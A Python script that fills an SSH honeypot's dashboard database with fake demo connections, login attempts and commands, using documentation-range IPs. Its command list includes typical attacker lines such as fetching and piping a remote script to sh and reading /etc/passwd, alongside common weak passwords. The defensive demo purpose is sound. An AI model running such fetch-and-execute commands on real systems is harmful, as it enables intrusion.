"""Fill the database with FAKE demo data so you can preview the dashboard
(and take screenshots) without waiting for real attackers.

All IPs are from documentation ranges (RFC 5737), none are real.

Usage:  python scripts/seed_demo_data.py
"""
import os
import random
import sys
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from honeypot.storage import Storage  # noqa: E402

random.seed(42)
USERS = ["root"] * 10 + ["admin"] * 4 + ["ubuntu", "test", "oracle", "user", "postgres", "pi", "git", "ftpuser"]
PASSES = ["123456", "admin", "password", "root", "toor", "12345678", "qwerty", "ubuntu", "test", "1234", "raspberry", "P@ssw0rd"]
CMDS = ["whoami", "uname -a", "id", "cat /etc/passwd", "ls -la", "uptime",
        "wget http://203.0.113.99/bot.sh", "curl -s http://198.51.100.7/x | sh", "cd /tmp"]
GEO = [("China", "Beijing", "AS4134", "China Telecom"), ("Russia", "Moscow", "AS12389", "Rostelecom"),
       ("United States", "Ashburn", "AS14061", "DigitalOcean"), ("Brazil", "Sao Paulo", "AS28573", "Claro"),
       ("India", "Mumbai", "AS55836", "Reliance Jio"), ("Germany", "Frankfurt", "AS24940", "Hetzner"),
       ("Vietnam", "Hanoi", "AS45899", "VNPT")]


def main():
    db = Storage()
    ips = [f"203.0.113.{i}" for i in range(1, 40)] + [f"198.51.100.{i}" for i in range(1, 20)]
    for ip in ips:
        db.save_ip_info(ip, *random.choice(GEO))
    now = datetime.now(timezone.utc)
    n = 0
    for _ in range(1500):
        ip = random.choice(ips)
        ts = (now - timedelta(minutes=random.randint(0, 60 * 24 * 7))).isoformat(timespec="seconds")
        db._exec("INSERT INTO connections (ts, ip, port, client_banner) VALUES (?,?,?,?)",
                 (ts, ip, random.randint(1024, 65000), "SSH-2.0-libssh_0.9.6"))
        db._exec("INSERT INTO auth_attempts (ts, ip, username, password, success) VALUES (?,?,?,?,1)",
                 (ts, ip, random.choice(USERS), random.choice(PASSES)))
        n += 1
        if random.random() < 0.15:
            for c in random.sample(CMDS, random.randint(1, 4)):
                db._exec("INSERT INTO commands (ts, ip, username, command) VALUES (?,?,?,?)",
                         (ts, ip, "root", c))
    print(f"Seeded {n} demo login attempts into {os.environ.get('HONEYPOT_DB', 'data/honeypot.db')}")


if __name__ == "__main__":
    main()
